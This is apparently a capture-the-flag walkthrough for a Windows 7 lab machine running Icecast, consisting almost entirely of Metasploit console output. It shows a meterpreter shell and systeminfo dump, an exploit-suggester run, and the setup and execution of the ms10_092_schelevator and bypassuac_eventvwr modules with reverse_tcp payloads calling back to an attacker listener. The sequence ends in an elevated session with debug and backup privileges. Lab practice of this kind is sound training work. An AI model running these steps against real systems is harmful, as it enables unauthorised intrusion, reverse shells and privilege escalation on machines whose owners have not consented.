
```
meterpreter > shell
Process 2032 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Program Files (x86)\Icecast2 Win32>
C:\Program Files (x86)\Icecast2 Win32>systeminfo
systeminfo

Host Name:                 DARK-PC
OS Name:                   Microsoft Windows 7 Professional 
OS Version:                6.1.7601 Service Pack 1 Build 7601
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          Dark
Registered Organization:   
Product ID:                00371-177-0000061-85305
Original Install Date:     11/12/2019, 4:48:23 PM
System Boot Time:          4/23/2022, 12:52:50 PM
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2400 Mhz
BIOS Version:              Xen 4.2.amazon, 8/24/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-06:00) Central Time (US & Canada)
Total Physical Memory:     2,048 MB
Available Physical Memory: 1,503 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,475 MB
Virtual Memory: In Use:    620 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\DARK-PC
Hotfix(s):                 2 Hotfix(s) Installed.
                           [01]: KB2534111
                           [02]: KB976902
Network Card(s):           1 NIC(s) Installed.
                           [01]: AWS PV Network Device
                                 Connection Name: Local Area Connection 2
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.0.1
                                 IP address(es)
                                 [01]: 10.10.24.121
                                 [02]: fe80::b85e:efab:7569:fcbb

C:\Program Files (x86)\Icecast2 Win32>
C:\Program Files (x86)\Icecast2 Win32>exit
```


Answer:1

```
meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.10.213.226 - Collecting local exploits for x86/windows...
[*] 10.10.213.226 - 4 exploit checks are being tried...
[+] 10.10.213.226 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.

meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(windows/http/icecast_header) > use exploit/windows/local/ms10_092_schelevator
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms10_092_schelevator) > options

Module options (exploit/windows/local/ms10_092_schelevator):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   CMD                        no        Command to execute instead of a payload
   SESSION                    yes       The session to run this module on.
   TASKNAME                   no        A name for the created task (default random)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.18.7     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows Vista, 7, and 2008


msf6 exploit(windows/local/ms10_092_schelevator) > set SESSION 1
SESSION => 1
msf6 exploit(windows/local/ms10_092_schelevator) > options

Module options (exploit/windows/local/ms10_092_schelevator):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   CMD                        no        Command to execute instead of a payload
   SESSION   1                yes       The session to run this module on.
   TASKNAME                   no        A name for the created task (default random)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.18.7     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows Vista, 7, and 2008


msf6 exploit(windows/local/ms10_092_schelevator) > set LHOST 10.4.27.78
LHOST => 10.4.27.78
msf6 exploit(windows/local/ms10_092_schelevator) > run



```



Answer: 2

```
meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.10.195.120 - Collecting local exploits for x86/windows...
[*] 10.10.195.120 - 40 exploit checks are being tried...
[+] 10.10.195.120 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[-] 10.10.195.120 - Post interrupted by the console user

```

Move the shell to the background:

```
(Meterpreter 1)(C:\Program Files (x86)\Icecast2 Win32) > background
[*] Backgrounding session 1...
[msf](Jobs:0 Agents:1) exploit(windows/http/icecast_header) >> 
```

Now that we have our session in the background, use the exploit we got in previous step:

```
[msf](Jobs:0 Agents:1) exploit(windows/http/icecast_header) >> use exploit/windows/local/bypassuac_eventvwr
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:1) exploit(windows/local/bypassuac_eventvwr) >> 
```

Set the session id in the options:

```
[msf](Jobs:0 Agents:1) exploit(windows/local/bypassuac_eventvwr) >> options

Module options (exploit/windows/local/bypassuac_eventvwr):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.18.7     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86


[msf](Jobs:0 Agents:1) exploit(windows/local/bypassuac_eventvwr) >> set SESSION 1
SESSION => 1
[msf](Jobs:0 Agents:1) exploit(windows/local/bypassuac_eventvwr) >>
```

Now that everything is set, run the exploit.

You will get a new session on successful completion, use it and get the list of priviledges we have.

```
[msf](Jobs:0 Agents:1) exploit(windows/local/bypassuac_eventvwr) >> run

[*] Started reverse TCP handler on 10.4.12.6:4444 
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Configuring payload and stager registry keys ...
[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe
[+] eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.
[*] Sending stage (175174 bytes) to 10.10.107.66
[*] Cleaning up registry keys ...
[*] Meterpreter session 2 opened (10.4.12.6:4444 -> 10.10.107.66:49193 ) at 2023-05-06 22:55:33 +0500

(Meterpreter 2)(C:\Windows\system32) > session 2
[-] Unknown command: session
(Meterpreter 2)(C:\Windows\system32) > sessions 2
[*] Session 2 is already interactive.
(Meterpreter 2)(C:\Windows\system32) > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

(Meterpreter 2)(C:\Windows\system32) > 

```





















